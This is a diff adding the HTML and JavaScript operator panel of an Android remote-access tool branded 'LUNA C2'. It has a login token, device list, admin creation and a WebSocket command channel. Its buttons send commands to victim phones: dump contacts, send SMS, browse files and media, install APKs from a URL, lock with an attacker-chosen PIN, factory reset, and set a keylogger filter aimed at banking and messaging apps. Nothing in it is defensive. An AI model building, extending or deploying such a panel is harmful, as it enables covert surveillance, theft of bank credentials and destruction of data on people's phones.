@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>LUNA C2 Panel</title>
+  <style>
+    :root {
+      --bg: #0A0E21;
+      --card: #12172B;
+      --border: #1A237E;
+      --accent: #00BCD4;
+      --text: #E0E0E0;
+      --muted: #78909C;
+      --danger: #FF5252;
+      --ok: #69F0AE;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Segoe UI', system-ui, sans-serif;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+    header {
+      background: var(--card);
+      border-bottom: 1px solid var(--border);
+      padding: 12px 20px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    header .brand { font-weight: 700; color: var(--accent); letter-spacing: 1px; }
+    header .meta { font-size: 13px; color: var(--muted); }
+    header button {
+      background: transparent;
+      border: 1px solid var(--border);
+      color: var(--text);
+      padding: 6px 12px;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 13px;
+    }
+    .layout { display: flex; flex: 1; overflow: hidden; }
+    .sidebar {
+      width: 320px;
+      background: var(--card);
+      border-right: 1px solid var(--border);
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+    }
+    .sidebar h3 {
+      padding: 14px 16px 8px;
+      font-size: 13px;
+      color: var(--muted);
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+    #deviceList { flex: 1; overflow-y: auto; padding: 0 8px 16px; }
+    .device-card {
+      background: #0A0E21;
+      border: 1px solid #1C2333;
+      border-radius: 10px;
+      padding: 12px;
+      margin-bottom: 8px;
+      cursor: pointer;
+      transition: border-color 0.15s;
+    }
+    .device-card:hover, .device-card.active { border-color: var(--accent); }
+    .device-card .model { font-weight: 600; font-size: 14px; }
+    .device-card .sub { font-size: 12px; color: var(--muted); margin-top: 4px; }
+    .device-card .dot {
+      display: inline-block;
+      width: 8px; height: 8px;
+      border-radius: 50%;
+      margin-right: 6px;
+    }
+    .dot.on { background: var(--ok); }
+    .dot.off { background: var(--danger); }
+    .main {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+    }
+    .main-empty {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: var(--muted);
+      font-size: 15px;
+    }
+    .cmd-area { display: none; flex: 1; flex-direction: column; overflow: hidden; }
+    .cmd-header {
+      padding: 14px 20px;
+      border-bottom: 1px solid var(--border);
+      background: var(--card);
+    }
+    .cmd-header h2 { font-size: 18px; }
+    .cmd-header .info { font-size: 12px; color: var(--muted); margin-top: 4px; }
+    .cmd-body {
+      flex: 1;
+      overflow-y: auto;
+      padding: 16px 20px;
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+      gap: 12px;
+      align-content: start;
+    }
+    .cmd-group {
+      background: var(--card);
+      border: 1px solid #1C2333;
+      border-radius: 10px;
+      padding: 14px;
+    }
+    .cmd-group h4 {
+      font-size: 12px;
+      color: var(--accent);
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      margin-bottom: 10px;
+    }
+    .cmd-group button, .cmd-group input, .cmd-group select {
+      width: 100%;
+      margin-bottom: 8px;
+      padding: 9px 12px;
+      border-radius: 7px;
+      border: 1px solid #263238;
+      background: #0A0E21;
+      color: var(--text);
+      font-size: 13px;
+    }
+    .cmd-group button {
+      background: #1A237E;
+      border-color: #1A237E;
+      cursor: pointer;
+      font-weight: 500;
+    }
+    .cmd-group button:hover { background: #283593; }
+    .cmd-group button.danger { background: #B71C1C; border-color: #B71C1C; }
+    .cmd-group button.danger:hover { background: #C62828; }
+    .log-pane {
+      height: 180px;
+      border-top: 1px solid var(--border);
+      background: #070A16;
+      overflow-y: auto;
+      padding: 10px 16px;
+      font-family: ui-monospace, monospace;
+      font-size: 12px;
+      color: #90A4AE;
+    }
+    .log-pane .line { margin-bottom: 3px; }
+    .log-pane .ok { color: var(--ok); }
+    .log-pane .err { color: var(--danger); }
+    .log-pane .info { color: var(--accent); }
+    /* Super admin section */
+    #superSection { display: none; padding: 12px 16px; border-bottom: 1px solid var(--border); }
+    #superSection input { width: 100%; margin-bottom: 6px; padding: 8px; border-radius: 6px; border: 1px solid #263238; background: #0A0E21; color: #fff; }
+    #superSection button { width: 100%; padding: 8px; border-radius: 6px; background: #00695C; border: none; color: #fff; cursor: pointer; }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="brand">LUNA C2</div>
+    <div class="meta" id="adminMeta">—</div>
+    <button onclick="logout()">Logout</button>
+  </header>
+
+  <div class="layout">
+    <div class="sidebar">
+      <div id="superSection">
+        <h3 style="padding:0 0 8px;color:var(--accent)">Create Admin</h3>
+        <input id="newCode" placeholder="Login code" />
+        <input id="newAdminId" placeholder="Admin ID (e.g. ADMIN_07)" />
+        <input id="newLabel" placeholder="Label (optional)" />
+        <button onclick="createAdmin()">Create</button>
+      </div>
+      <h3>Devices <span id="devCount"></span></h3>
+      <div id="deviceList"></div>
+    </div>
+
+    <div class="main">
+      <div class="main-empty" id="emptyState">Select a device</div>
+      <div class="cmd-area" id="cmdArea">
+        <div class="cmd-header">
+          <h2 id="devTitle">—</h2>
+          <div class="info" id="devInfo">—</div>
+        </div>
+        <div class="cmd-body">
+          <!-- Sensory -->
+          <div class="cmd-group">
+            <h4>Sensory</h4>
+            <button onclick="sendCmd({action:'vibrate',duration:800})">Vibrate</button>
+            <button onclick="sendCmd({action:'sound'})">Play Sound</button>
+          </div>
+          <!-- Apps -->
+          <div class="cmd-group">
+            <h4>Apps</h4>
+            <button onclick="sendCmd({action:'list_apps'})">List Apps</button>
+            <input id="pkgInput" placeholder="package.name" />
+            <button onclick="sendCmd({action:'open_app',package:val('pkgInput')})">Open App</button>
+            <button onclick="sendCmd({action:'node_tree'})">Dump Node Tree</button>
+          </div>
+          <!-- Input -->
+          <div class="cmd-group">
+            <h4>Input / Gesture</h4>
+            <input id="tapX" placeholder="X" style="width:48%;display:inline-block" />
+            <input id="tapY" placeholder="Y" style="width:48%;display:inline-block;float:right" />
+            <button onclick="sendCmd({action:'tap',x:+val('tapX')||0,y:+val('tapY')||0})">Tap</button>
+            <button onclick="sendCmd({action:'back'})">Back</button>
+            <button onclick="sendCmd({action:'home'})">Home</button>
+          </div>
+          <!-- Contacts / SMS -->
+          <div class="cmd-group">
+            <h4>Contacts & SMS</h4>
+            <button onclick="sendCmd({action:'list_contacts'})">List Contacts</button>
+            <input id="smsTo" placeholder="Phone number" />
+            <input id="smsBody" placeholder="Message" />
+            <button onclick="sendCmd({action:'send_sms',to:val('smsTo'),body:val('smsBody')})">Send SMS</button>
+          </div>
+          <!-- Files / Media -->
+          <div class="cmd-group">
+            <h4>Files & Media</h4>
+            <input id="filePath" placeholder="/sdcard/Download" value="/sdcard" />
+            <button onclick="sendCmd({action:'list_files',path:val('filePath')})">List Files</button>
+            <button onclick="sendCmd({action:'list_media',type:'images'})">List Images</button>
+            <button onclick="sendCmd({action:'list_media',type:'video'})">List Videos</button>
+          </div>
+          <!-- URL / Install -->
+          <div class="cmd-group">
+            <h4>URL & Install</h4>
+            <input id="urlInput" placeholder="https://..." />
+            <button onclick="sendCmd({action:'open_url',url:val('urlInput')})">Open URL</button>
+            <input id="apkUrl" placeholder="APK direct URL" />
+            <button onclick="sendCmd({action:'install_apk',url:val('apkUrl')})">Install APK (best-effort)</button>
+          </div>
+          <!-- Lock / Power -->
+          <div class="cmd-group">
+            <h4>Lock & Power</h4>
+            <input id="lockPin" placeholder="Custom PIN (optional)" />
+            <button onclick="sendCmd({action:'lock',pin:val('lockPin')})">Lock Phone</button>
+            <button onclick="sendCmd({action:'power_off'})">Attempt Power Off</button>
+            <button class="danger" onclick="confirmWipe()">Factory Reset (DPM)</button>
+          </div>
+          <!-- Keylog -->
+          <div class="cmd-group">
+            <h4>Keylog Filter</h4>
+            <input id="keylogPkgs" placeholder="com.bank,com.whatsapp (comma)" />
+            <button onclick="setKeylog()">Set Filter</button>
+            <button onclick="sendCmd({action:'keylog_filter',packages:[]})">Clear Filter (all)</button>
+          </div>
+        </div>
+        <div class="log-pane" id="logPane"></div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const token = localStorage.getItem('luna_token');
+    const admin = JSON.parse(localStorage.getItem('luna_admin') || 'null');
+    if (!token || !admin) location.href = '/';
+
+    document.getElementById('adminMeta').textContent =
+      `${admin.label || admin.admin_id} (${admin.is_super ? 'SUPER' : admin.admin_id})`;
+
+    if (admin.is_super) {
+      document.getElementById('superSection').style.display = 'block';
+    }
+
+    let selectedDevice = null;
+    let ws = null;
+    let cmdCounter = 0;
+
+    function val(id) { return document.getElementById(id).value.trim(); }
+
+    function log(msg, cls = '') {
+      const pane = document.getElementById('logPane');
+      const line = document.createElement('div');
+      line.className = 'line ' + cls;
+      line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+      pane.appendChild(line);
+      pane.scrollTop = pane.scrollHeight;
+    }
+
+    function connectWS() {
+      const proto = location.protocol === 'https:' ? 'wss' : 'ws';
+      ws = new WebSocket(`${proto}://${location.host}/panel/ws`);
+      ws.onopen = () => {
+        ws.send(JSON.stringify({ token }));
+        log('Panel connected', 'ok');
+      };
+      ws.onmessage = (ev) => {
+        const msg = JSON.parse(ev.data);
+        if (msg.type === 'device_list') {
+          renderDevices(msg.devices || []);
+        } else if (msg.type === 'device_update') {
+          upsertDevice(msg.device);
+        } else if (msg.type === 'event') {
+          log(`EVENT ${msg.device_id}: ${JSON.stringify(msg.data)}`, 'info');
+        } else if (msg.type === 'ack') {
+          log(`ACK ${msg.id}`, 'ok');
+        } else if (msg.type === 'error') {
+          log(msg.error, 'err');
+        }
+      };
+      ws.onclose = () => {
+        log('Panel disconnected — reconnecting…', 'err');
+        setTimeout(connectWS, 3000);
+      };
+    }
+
+    function renderDevices(list) {
+      const el = document.getElementById('deviceList');
+      document.getElementById('devCount').textContent = `(${list.length})`;
+      el.innerHTML = '';
+      list.sort((a, b) => (b.last_seen || 0) - (a.last_seen || 0));
+      list.forEach(d => {
+        const card = document.createElement('div');
+        card.className = 'device-card' + (selectedDevice === d.device_id ? ' active' : '');
+        card.onclick = () => selectDevice(d);
+        const online = d.online ? 'on' : 'off';
+        card.innerHTML = `
+          <div class="model"><span class="dot ${online}"></span>${d.model || d.device_id}</div>
+          <div class="sub">${d.manufacturer || ''} · Android ${d.android || '?'} · ${d.admin_id}</div>
+          <div class="sub">${d.device_id.slice(0, 12)}… · ${d.online ? 'online' : 'offline'}</div>
+        `;
+        el.appendChild(card);
+      });
+    }
+
+    function upsertDevice(d) {
+      // Simple: re-request full list via existing state by re-rendering from last known
+      // For robustness we keep a local map
+      if (!window._devMap) window._devMap = {};
+      window._devMap[d.device_id] = d;
+      renderDevices(Object.values(window._devMap));
+    }
+
+    function selectDevice(d) {
+      selectedDevice = d.device_id;
+      document.getElementById('emptyState').style.display = 'none';
+      document.getElementById('cmdArea').style.display = 'flex';
+      document.getElementById('devTitle').textContent = d.model || d.device_id;
+      document.getElementById('devInfo').textContent =
+        `${d.manufacturer} · Android ${d.android} · admin_id=${d.admin_id} · ${d.online ? 'ONLINE' : 'OFFLINE'}`;
+      // refresh highlight
+      if (window._devMap) renderDevices(Object.values(window._devMap));
+    }
+
+    function sendCmd(cmd) {
+      if (!selectedDevice) return;
+      cmd.id = 'cmd-' + (++cmdCounter);
+      if (!ws || ws.readyState !== 1) {
+        log('WS not ready', 'err');
+        return;
+      }
+      ws.send(JSON.stringify({
+        type: 'command',
+        device_id: selectedDevice,
+        cmd
+      }));
+      log(`→ ${cmd.action} (${cmd.id})`, 'info');
+    }
+
+    function setKeylog() {
+      const raw = val('keylogPkgs');
+      const packages = raw ? raw.split(',').map(s => s.trim()).filter(Boolean) : [];
+      sendCmd({ action: 'keylog_filter', packages });
+    }
+
+    function confirmWipe() {
+      if (!confirm('FACTORY RESET this device? This cannot be undone.')) return;
+      sendCmd({ action: 'factory_reset', method: 'dpm' });
+    }
+
+    async function createAdmin() {
+      const code = val('newCode');
+      const admin_id = val('newAdminId');
+      const label = val('newLabel') || admin_id;
+      if (!code || !admin_id) return alert('code + admin_id required');
+      const r = await fetch('/api/create_admin', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json', 'X-Token': token },
+        body: JSON.stringify({ code, admin_id, label, token })
+      });
+      const j = await r.json();
+      if (j.ok) {
+        log(`Created admin ${admin_id} / code ${code}`, 'ok');
+        document.getElementById('newCode').value = '';
+        document.getElementById('newAdminId').value = '';
+        document.getElementById('newLabel').value = '';
+      } else {
+        log(j.detail || 'create failed', 'err');
+      }
+    }
+
+    function logout() {
+      localStorage.removeItem('luna_token');
+      localStorage.removeItem('luna_admin');
+      location.href = '/';
+    }
+
+    // boot
+    window._devMap = {};
+    connectWS();
+  </script>
+</body>
+</html>
